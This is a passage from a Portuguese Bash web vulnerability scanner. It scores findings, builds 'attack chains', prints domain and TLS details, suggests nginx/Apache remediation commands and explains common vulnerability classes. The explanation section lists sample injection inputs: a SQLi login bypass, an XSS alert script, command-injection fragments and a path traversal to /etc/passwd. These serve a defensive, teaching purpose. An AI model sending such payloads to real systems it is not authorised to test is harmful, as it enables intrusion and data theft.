path_trav=$(echo "$REPORT_TEXT" | grep -c "PATH TRAVERSAL")
phpinfo=$(echo "$REPORT_TEXT" | grep -c "PHPINFO EXPOSTO")
cors=$(echo "$REPORT_TEXT" | grep -c "CORS MISCONFIG")

# Regras de correlacao
if [ "$put_detect" -gt 0 ] && [ "$git_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("PUT + .git exposto: Atacante pode fazer upload de webshell e roubar credenciais do git")
  CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 20))
fi
if [ "$put_detect" -gt 0 ] && [ "$default_creds" -gt 0 ]; then
  ATTACK_CHAINS+=("PUT + credenciais padrao: Atacante faz upload de webshell e acessa painel admin")
  CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 25))
fi
if [ "$sql_detect" -gt 0 ] && [ "$config_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("SQLi + config exposto: Atacante extrai dados do banco e obtem credenciais do sistema")
  CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 30))
fi
if [ "$sql_detect" -gt 0 ] && [ "$env_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("SQLi + .env exposto: Atacante extrai dados + chaves de API do ambiente")
  CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 25))
fi
if [ "$default_creds" -gt 0 ] && [ "$put_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("Credenciais + PUT: Atacante loga como admin e faz upload de webshell - TOMADA TOTAL")
  CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 35))
fi
if [ "$git_detect" -gt 0 ] && [ "$env_detect" -gt 0 ]; then
  ATTACK_CHAINS+=("Git + .env exposto: Vazamento de codigo fonte + credenciais de producao")
  CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 20))
fi
if [ "$x_frame" -gt 0 ] && [ "$cors" -gt 0 ]; then
  ATTACK_CHAINS+=("Clickjacking + CORS: Site pode ser iframado e API acessada de qualquer origem")
  CORRELATION_WEIGHT=$((CORRELATION_WEIGHT + 15))
fi

# Calcula pontuacao total ponderada
TOTAL_PONTOS=0
TOTAL_ACHADOS=$(echo "$REPORT_TEXT" | grep -cE "\[CRITICO\]|\[ALERTA\]")
PONTUACAO_MAXIMA=$((TOTAL_ACHADOS * 100))
[ "$PONTUACAO_MAXIMA" -eq 0 ] && PONTUACAO_MAXIMA=1

for key in "${!SCORES[@]}"; do
  count=$(echo "$REPORT_TEXT" | grep -c "$key")
  [ "$count" -gt 0 ] && TOTAL_PONTOS=$((TOTAL_PONTOS + (SCORES[$key] * count)))
done

TOTAL_PONTOS=$((TOTAL_PONTOS + CORRELATION_WEIGHT))
PERCENT_RISCO=$((TOTAL_PONTOS * 100 / (TOTAL_ACHADOS * 100 + CORRELATION_WEIGHT)))
[ "$PERCENT_RISCO" -gt 100 ] && PERCENT_RISCO=100
[ "$PERCENT_RISCO" -lt 0 ] && PERCENT_RISCO=0

# Nivel de risco pelo score IA
if [ "$PERCENT_RISCO" -ge 75 ]; then IA_NIVEL="CRITICO"; IA_COR=$RED
elif [ "$PERCENT_RISCO" -ge 50 ]; then IA_NIVEL="ALTO"; IA_COR=$YELLOW
elif [ "$PERCENT_RISCO" -ge 25 ]; then IA_NIVEL="MEDIO"; IA_COR=$YELLOW
else IA_NIVEL="BAIXO"; IA_COR=$GREEN
fi

# Vetor de ataque principal
MAIN_VECTOR=""
if [ "$put_detect" -gt 0 ] && [ "$default_creds" -gt 0 ]; then
  MAIN_VECTOR="Upload + Admin -> RCE"
elif [ "$sql_detect" -gt 0 ] && [ "$config_detect" -gt 0 ]; then
  MAIN_VECTOR="SQLi + Config -> Data Breach"
elif [ "$put_detect" -gt 0 ]; then
  MAIN_VECTOR="PUT -> RCE"
elif [ "$default_creds" -gt 0 ]; then
  MAIN_VECTOR="Default Creds -> Admin Access"
elif [ "$sql_detect" -gt 0 ]; then
  MAIN_VECTOR="SQLi -> Data Extraction"
else
  MAIN_VECTOR="Info Gathering -> Hardening"
fi

echo ""
echo -e "${IA_COR}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${IA_COR}${BOLD}║         IA BRAIN - ANALISE DO MOTOR             ║${RESET}"
echo -e "${IA_COR}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Risco calculado:${RESET}  ${IA_COR}${PERCENT_RISCO}% - ${IA_NIVEL}${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Achados:${RESET}         ${CYAN}$TOTAL_ACHADOS${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Peso correlacao:${RESET}  ${CYAN}+${CORRELATION_WEIGHT}${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Vetor principal:${RESET}  ${IA_COR}$MAIN_VECTOR${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Cadeias de ataque detectadas:${RESET}"
if [ ${#ATTACK_CHAINS[@]} -eq 0 ]; then
  echo -e "${IA_COR}${BOLD}║${RESET}    ${GREEN}Nenhuma cadeia critica identificada${RESET}"
else
  for chain in "${ATTACK_CHAINS[@]}"; do
    echo -e "${IA_COR}${BOLD}║${RESET}    ${RED}[!] $chain${RESET}"
  done
fi
echo -e "${IA_COR}${BOLD}║${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Analise de impacto:${RESET}"
echo -e "${IA_COR}${BOLD}║${RESET}  $(echo "$REPORT_TEXT" | grep -c "SQL INJECTION")x SQL Injection - $(echo "$REPORT_TEXT" | grep -c "SQL INJECTION" | xargs -I{} [ {} -gt 0 ] && echo "${RED}Risco de perda total de dados${RESET}" || echo "${GREEN}Nenhum${RESET}")"
echo -e "${IA_COR}${BOLD}║${RESET}  $(echo "$REPORT_TEXT" | grep -c "Metodo PUT\|WEBSHELL")x Upload de arquivos - $(echo "$REPORT_TEXT" | grep -c "Metodo PUT\|WEBSHELL" | xargs -I{} [ {} -gt 0 ] && echo "${RED}Execucao remota de codigo${RESET}" || echo "${GREEN}Nenhum${RESET}")"
echo -e "${IA_COR}${BOLD}║${RESET}  $(echo "$REPORT_TEXT" | grep -c "DEFAULT CREDENTIALS")x Credenciais padrao - $(echo "$REPORT_TEXT" | grep -c "DEFAULT CREDENTIALS" | xargs -I{} [ {} -gt 0 ] && echo "${RED}Acesso administrativo indesejado${RESET}" || echo "${GREEN}Nenhum${RESET}")"
echo -e "${IA_COR}${BOLD}║${RESET}  $(echo "$REPORT_TEXT" | grep -c "REPOSITORIO GIT\|ARQUIVO .ENV\|CONFIG EXPOSTO\|BACKUP")x Vazamento de dados - $(echo "$REPORT_TEXT" | grep -c "REPOSITORIO GIT\|ARQUIVO .ENV\|CONFIG EXPOSTO\|BACKUP" | xargs -I{} [ {} -gt 0 ] && echo "${RED}Exposicao de informacoes sensiveis${RESET}" || echo "${GREEN}Nenhum${RESET}")"
echo -e "${IA_COR}${BOLD}║${RESET}  $(echo "$REPORT_TEXT" | grep -c "Falta X-Frame\|Falta CSP\|Falta HSTS\|Cookie sem")x Headers ausentes - $(echo "$REPORT_TEXT" | grep -c "Falta X-Frame\|Falta CSP\|Falta HSTS\|Cookie sem" | xargs -I{} [ {} -gt 4 ] && echo "${YELLOW}Protecao navegador insuficiente${RESET}" || echo "${GREEN}Ok${RESET}")"
echo -e "${IA_COR}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"

# Salva analise IA no relatorio
{
  echo ""
  echo "============================================"
  echo "IA BRAIN ANALYSIS"
  echo "============================================"
  echo "Risco calculado: $PERCENT_RISCO% - $IA_NIVEL"
  echo "Achados: $TOTAL_ACHADOS"
  echo "Peso correlacao: +$CORRELATION_WEIGHT"
  echo "Vetor principal: $MAIN_VECTOR"
  echo "Cadeias de ataque:"
  for chain in "${ATTACK_CHAINS[@]}"; do
    echo "  [!!] $chain"
  done
  echo "============================================"
} >> "$REPORT"

# ============================================================
# RESUMO
# ============================================================
echo ""
echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${MAGENTA}${BOLD}║              RESUMO DA VARREDURA                ║${RESET}"
echo -e "${MAGENTA}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"

TOTAL_CRITICOS=$(grep -c "\[CRITICO\]" "$REPORT" 2>/dev/null)
TOTAL_ALERTAS=$(grep -c "\[ALERTA\]" "$REPORT" 2>/dev/null)
TOTAL=$(grep -c "\[CRITICO\]\|\[ALERTA\]" "$REPORT" 2>/dev/null)

echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Alvo:${RESET}            ${CYAN}$ALVO${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Dominio:${RESET}         ${CYAN}$DOMINIO${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Relatorio:${RESET}       ${CYAN}$REPORT${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Problemas criticos:${RESET}  ${RED}$TOTAL_CRITICOS${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Alertas:${RESET}             ${YELLOW}$TOTAL_ALERTAS${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Total de achados:${RESET}    ${MAGENTA}$TOTAL${RESET}"
echo -e "${MAGENTA}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"

echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}NIVEL DE VULNERABILIDADE:${RESET}"
BARRA_MAX=40
if [ "$TOTAL" -ge 30 ]; then COR=$RED; NIVEL="CRITICO"
elif [ "$TOTAL" -ge 15 ]; then COR=$YELLOW; NIVEL="ALTO"
elif [ "$TOTAL" -ge 5 ]; then COR=$YELLOW; NIVEL="MEDIO"
else COR=$GREEN; NIVEL="BAIXO"
fi
N_PREENCHIDO=$((TOTAL < BARRA_MAX ? TOTAL : BARRA_MAX))
BARRA=$(printf "%${N_PREENCHIDO}s" | tr ' ' '#' 2>/dev/null)
BARRA_VAZIA=$(printf "%$((BARRA_MAX - N_PREENCHIDO))s" 2>/dev/null | tr ' ' '-')

echo -e "${MAGENTA}${BOLD}║${RESET}  ${COR}[${BARRA}${BARRA_VAZIA}]${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${COR}Nivel: ${NIVEL}${RESET}"
echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Emitir relatorio...${RESET}  ${CYAN}cat $REPORT${RESET}"
echo ""

# ============================================================
# PASSO 24: INFORMACOES DO SITE
# ============================================================
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${GREEN}${BOLD}║           INFORMACOES DO SITE                   ║${RESET}"
echo -e "${GREEN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"

SERVER_HEADER=$(curl -sI "$ALVO" 2>/dev/null | grep -i "^server:" | sed 's/.*: //')
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Servidor:${RESET}       ${CYAN}${SERVER_HEADER:-Nao identificado}${RESET}"

if echo "$SERVER_HEADER" | grep -qi "cloudflare\|cloudflare-nginx"; then
  echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}CDN:${RESET}            ${YELLOW}Cloudflare detectado!${RESET}"
elif curl -sI "$ALVO" 2>/dev/null | grep -qi "cf-ray\|__cfduid\|cf-cache-status"; then
  echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}CDN:${RESET}            ${YELLOW}Cloudflare detectado!${RESET}"
fi

POWERED_BY=$(curl -sI "$ALVO" 2>/dev/null | grep -i "^x-powered-by:" | sed 's/.*: //')
[ -n "$POWERED_BY" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Powered by:${RESET}    ${CYAN}$POWERED_BY${RESET}"

echo -e "${GREEN}${BOLD}║${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}-- Informacoes do Dominio --${RESET}"
WHOIS_DATA=$(whois "$DOMINIO" 2>/dev/null)
CREATION=$(echo "$WHOIS_DATA" | grep -iE "creation date|criado em|criado" | head -1 | sed 's/.*: //')
if [ -n "$CREATION" ]; then
  echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Criado em:${RESET}      ${CYAN}$CREATION${RESET}"
  CREATION_SEC=$(date -d "$CREATION" +%s 2>/dev/null)
  NOW_SEC=$(date +%s)
  if [ -n "$CREATION_SEC" ]; then
    DIAS=$(( (NOW_SEC - CREATION_SEC) / 86400 ))
    ANOS=$(( DIAS / 365 ))
    MESES=$(( (DIAS % 365) / 30 ))
    echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Idade:${RESET}          ${CYAN}$ANOS anos, $MESES meses ($DIAS dias)${RESET}"
  fi
fi
EXPIRY=$(echo "$WHOIS_DATA" | grep -iE "expir|vence" | head -1 | sed 's/.*: //')
[ -n "$EXPIRY" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Expira em:${RESET}      ${CYAN}$EXPIRY${RESET}"
REGISTRAR=$(echo "$WHOIS_DATA" | grep -iE "registrar|registrador" | head -1 | sed 's/.*: //')
[ -n "$REGISTRAR" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${Bold}Registrador:${RESET}   ${CYAN}$REGISTRAR${RESET}"

echo -e "${GREEN}${BOLD}║${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}-- SSL/TLS --${RESET}"
if [ "$PROTOCOLO" = "https" ]; then
  SSL_INFO=$(echo | openssl s_client -connect "${DOMINIO}:443" -servername "$DOMINIO" 2>/dev/null)
  SSL_ISSUER=$(echo "$SSL_INFO" | openssl x509 -noout -issuer 2>/dev/null | sed 's/.*CN = //')
  SSL_EXPIRY=$(echo "$SSL_INFO" | openssl x509 -noout -enddate 2>/dev/null | sed 's/.*= //')
  [ -n "$SSL_ISSUER" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Emissor SSL:${RESET}    ${CYAN}$SSL_ISSUER${RESET}"
  if [ -n "$SSL_EXPIRY" ]; then
    echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Certificado:${RESET}    ${CYAN}Valido ate $SSL_EXPIRY${RESET}"
    SSL_EXP_SEC=$(date -d "$SSL_EXPIRY" +%s 2>/dev/null)
    if [ -n "$SSL_EXP_SEC" ]; then
      RESTAM=$(( (SSL_EXP_SEC - NOW_SEC) / 86400 ))
      if [ "$RESTAM" -lt 0 ]; then
        echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Status SSL:${RESET}     ${RED}VENCIDO ha $((RESTAM * -1)) dias!${RESET}"
      elif [ "$RESTAM" -lt 30 ]; then
        echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Status SSL:${RESET}     ${YELLOW}Vence em $RESTAM dias (URGENTE!)${RESET}"
      else
        echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Status SSL:${RESET}     ${GREEN}Vence em $RESTAM dias${RESET}"
      fi
    fi
  fi
else
  echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}SSL:${RESET}            ${YELLOW}Site sem HTTPS!${RESET}"
fi

echo -e "${GREEN}${BOLD}║${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}-- Rede / IP --${RESET}"
IP=$(host "$DOMINIO" 2>/dev/null | awk '/has address/{print $NF; exit}') 2>/dev/null
[ -n "$IP" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}IP:${RESET}             ${CYAN}$IP${RESET}"
ASN=$(whois "$IP" 2>/dev/null | grep -iE "origin|asn|aut-num" | head -1 | sed 's/.*: *//')
[ -n "$ASN" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}ASN:${RESET}            ${CYAN}$ASN${RESET}"
PROVEDOR=$(echo "$WHOIS_DATA" | grep -iE "orgname|org name|owner-c|provedor" | head -1 | sed 's/.*: //')
[ -n "$PROVEDOR" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Provedor:${RESET}       ${CYAN}$PROVEDOR${RESET}"
PAIS=$(whois "$IP" 2>/dev/null | grep -iE "country|pais" | head -1 | sed 's/.*: *//')
[ -n "$PAIS" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Pais:${RESET}           ${CYAN}$PAIS${RESET}"

echo -e "${GREEN}${BOLD}║${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}-- Tecnologias Detectadas --${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${CYAN}Veja o WhatWeb acima para tecnologias completas${RESET}"
X_POWERED=$(curl -sI "$ALVO" 2>/dev/null | grep -i "^x-powered-by:" | sed 's/.*: //')
[ -n "$X_POWERED" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}X-Powered-By:${RESET}  ${CYAN}$X_POWERED${RESET}"

echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""

# ============================================================
# REMENDIACAO - Comandos para corrigir cada vulnerabilidade
# ============================================================
echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${RED}${BOLD}║        REMENDIACAO - Comandos de correcao        ║${RESET}"
echo -e "${RED}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"

echo "$REPORT_TEXT" | while IFS= read -r line; do
  fix=""
  echo "$line" | grep -qi "SQL INJECTION" && fix="Corrigir SQLi: Use prepared statements (PDO/mysqli) e escape de parametros. Ex: \$stmt = \$pdo->prepare('SELECT * FROM users WHERE id = ?'); \$stmt->execute([\$id]);"
  echo "$line" | grep -qi "Falta X-Frame-Options\|Clickjacking" && fix="Clicljacking: add_header X-Frame-Options \"SAMEORIGIN\" always;"
  echo "$line" | grep -qi "Metodo PUT habilitado\|WEBSHELL" && fix="PUT ativo: No nginx: if (\$request_method ~* \"(PUT|DELETE|PATCH)\") { return 405; }  No Apache: <LimitExcept GET POST HEAD> deny from all </LimitExcept>"
  echo "$line" | grep -qi "DEFAULT CREDENTIALS" && fix="Credenciais padrao: Altere imediatamente as senhas. Use: htpasswd -c /etc/nginx/.htpasswd admin  e remova usuarios padrao."
  echo "$line" | grep -qi "REPOSITORIO GIT EXPOSTO" && fix="Git exposto: Bloqueie .git no nginx: location ~ /\.git { deny all; }  No Apache: RedirectMatch 404 /\\.git(/.*)?$"
  echo "$line" | grep -qi "ARQUIVO .ENV EXPOSTO" && fix=".env exposto: Nao sirva arquivos .env. No nginx: location ~ /\\.env { deny all; }"
  echo "$line" | grep -qi "CONFIG EXPOSTO\|BACKUP WP-CONFIG\|BACKUP BD" && fix="Config/backup exposto: Bloqueie no servidor: location ~* \\.(bak|old|sql|dump|swp|save)$ { deny all; }"
  echo "$line" | grep -qi "Falta HSTS" && fix="HSTS: add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;"
  echo "$line" | grep -qi "Falta CSP" && fix="CSP: add_header Content-Security-Policy \"default-src 'self'; script-src 'self'; style-src 'self'\" always;"
  echo "$line" | grep -qi "Falta X-Content-Type-Options" && fix="X-Content-Type-Options: add_header X-Content-Type-Options \"nosniff\" always;"
  echo "$line" | grep -qi "Falta X-XSS-Protection" && fix="XSS-Protection: add_header X-XSS-Protection \"1; mode=block\" always;"
  echo "$line" | grep -qi "Cookie sem flag Secure\|Cookie sem.*Secure" && fix="Cookie Secure: setcookie('nome', \$valor, ['secure' => true, 'httponly' => true, 'samesite' => 'Strict']);"
  echo "$line" | grep -qi "CROSSDOMAIN.XML" && fix="Crossdomain: Delete o arquivo crossdomain.xml ou restrinja: <allow-access-from domain=\"seudominio.com\" />"
  echo "$line" | grep -qi "OPEN REDIRECT" && fix="Open redirect: Valide o parametro de redirect com uma whitelist de URLs permitidas."
  echo "$line" | grep -qi "PHPINFO EXPOSTO\|INFO PHP EXPOSTA" && fix="phpinfo exposto: Delete phpinfo.php e info.php. Nao mantenha arquivos de debug em producao."
  echo "$line" | grep -qi "BACKUP EXPOSTO" && fix="Backup exposto: Nao armazene backups no diretorio publico do servidor web."
  echo "$line" | grep -qi "SERVICO ENCONTRADO:.*phpinfo\|SERVICO ENCONTRADO:.*info" && fix="phpinfo remova: rm -f /var/www/html/phpinfo.php /var/www/html/info.php"
  echo "$line" | grep -qi "SERVICO ENCONTRADO:.*adminer" && fix="Adminer remova: rm -f /var/www/html/adminer.php. Nao use ferramentas de banco em producao."
  echo "$line" | grep -qi "SERVICO ENCONTRADO:.*server-status\|SERVICO ENCONTRADO:.*server-info" && fix="Server-status: Desabilite no Apache: a2disconf server-status  ou no nginx remova o bloco location."
  echo "$line" | grep -qi "SERVICO ENCONTRADO:.*cgi-bin" && fix="CGI: Se nao precisar, desabilite: a2dismod cgi && systemctl restart apache2"
  echo "$line" | grep -qi "PATH TRAVERSAL" && fix="Path traversal: Nao confie em input do usuario para caminhos de arquivos. Use basename() e realpath() para validar."
  echo "$line" | grep -qi "ACESSO LIVRE:.*admin\|ACESSO LIVRE:.*wp-admin\|ACESSO LIVRE:.*painel\|ACESSO LIVRE:.*dashboard" && fix="Painel exposto: Restrinja por IP: allow 192.168.1.0/24; deny all;"
  echo "$line" | grep -qi "CORS MISCONFIG" && fix="CORS: Nao use Access-Control-Allow-Origin: *. Defina origens especificas ou valide o header Origin."
  echo "$line" | grep -qi "Apache versao antiga" && fix="Apache desatualizado: sudo apt-get update && sudo apt-get upgrade apache2"
  echo "$line" | grep -qi "Nginx versao antiga" && fix="Nginx desatualizado: sudo apt-get update && sudo apt-get upgrade nginx"
  echo "$line" | grep -qi "PHP versao antiga" && fix="PHP desatualizado: sudo apt-get update && sudo apt-get upgrade php"
  echo "$line" | grep -qi "IIS versao antiga" && fix="IIS desatualizado: Atualize o Windows Server e o IIS via Windows Update."
  echo "$line" | grep -qi "WAF detectado" && fix="WAF detectado: Revise as regras do WAF. Possivel falso positivo ou configuracao excessivamente restritiva."
  echo "$line" | grep -qi "AUTENTICACAO REQUERIDA.*401" && fix="Autenticacao: Reforce as politicas de senha. Considere autenticacao de dois fatores (2FA)."
  if [ -n "$fix" ]; then
    achado=$(echo "$line" | sed 's/\[CRITICO\] //;s/\[ALERTA\] //')
    echo -e "${RED}${BOLD}║${RESET}"
    echo -e "${RED}${BOLD}║${RESET}  ${BOLD}Achado:${RESET} ${YELLOW}$achado${RESET}"
    echo -e "${RED}${BOLD}║${RESET}  ${BOLD}FIX:${RESET}   ${GREEN}$fix${RESET}"
    echo -e "${RED}${BOLD}║${RESET}  ${BOLD}CMD:${RESET}   ${CYAN}$(echo "$fix" | grep -oP 'sudo[^.\n]*|a2dismod[^.\n]*|rm -f[^.\n]*|systemctl[^.\n]*|htpasswd[^.\n]*|RedirectMatch[^.\n]*|allow[^.\n]*|add_header[^.\n]*|setcookie[^.\n]*|location[^.\n]*|IfModule[^.\n]*|LimitExcept[^.\n]*' | head -1)${RESET}"
    {
      echo ""
      echo "[FIX] $achado"
      echo "  Comando: $(echo "$fix" | grep -oP 'sudo[^.\n]*|a2dismod[^.\n]*|rm -f[^.\n]*|systemctl[^.\n]*|htpasswd[^.\n]*|RedirectMatch[^.\n]*|add_header[^.\n]*|location[^.\n]*|LimitExcept[^.\n]*' | head -1)"
    } >> "$REPORT"
  fi
done

echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""

# ============================================================
# EXPLICACAO DAS VULNERABILIDADES
# ============================================================
echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${CYAN}${BOLD}║        EXPLICACAO DAS VULNERABILIDADES          ║${RESET}"
echo -e "${CYAN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"

echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}SQL Injection:${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Injetar comandos SQL nos campos de entrada"
echo -e "${CYAN}${BOLD}║${RESET}  para manipular o banco de dados."
echo -e "${CYAN}${BOLD}║${RESET}  Ex: ' OR 1=1 -- - no campo de login"
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}XSS (Cross-Site Scripting):${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Injetar scripts maliciosos no site"
echo -e "${CYAN}${BOLD}║${RESET}  para roubar cookies ou redirecionar."
echo -e "${CYAN}${BOLD}║${RESET}  Ex: <script>alert('XSS')</script>"
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}Command Injection:${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Executar comandos no servidor atraves"
echo -e "${CYAN}${BOLD}║${RESET}  de inputs maliciosos."
echo -e "${CYAN}${BOLD}║${RESET}  Ex: ; ls -la ou | whoami"
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}LFI/RFI (File Inclusion):${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Incluir arquivos locais ou remotos"
echo -e "${CYAN}${BOLD}║${RESET}  para vazar dados sensiveis."
echo -e "${CYAN}${BOLD}║${RESET}  Ex: ../../../etc/passwd"
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}CSRF (Cross-Site Request Forgery):${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Forcar usuario a executar acoes"
echo -e "${CYAN}${BOLD}║${RESET}  sem seu consentimento."
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}Clickjacking:${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Site pode ser colocado dentro de um iframe"
echo -e "${CYAN}${BOLD}║${RESET}  e cliques podem ser sequestrados."
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}Metodo PUT habilitado:${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Atacante pode fazer upload de arquivos"
echo -e "${CYAN}${BOLD}║${RESET}  maliciosos (webshell) no servidor."
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}Diretorios expostos:${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Pastas como /admin, /backup, /.git"
echo -e "${CYAN}${BOLD}║${RESET}  acessiveis publicamente vazam informacoes."
echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""

{
  echo ""
  echo "============================================"
  echo "RESUMO: $TOTAL_CRITICOS criticos, $TOTAL_ALERTAS alertas"
  echo "NIVEL: $NIVEL"
  echo "============================================"
} >> "$REPORT"

done
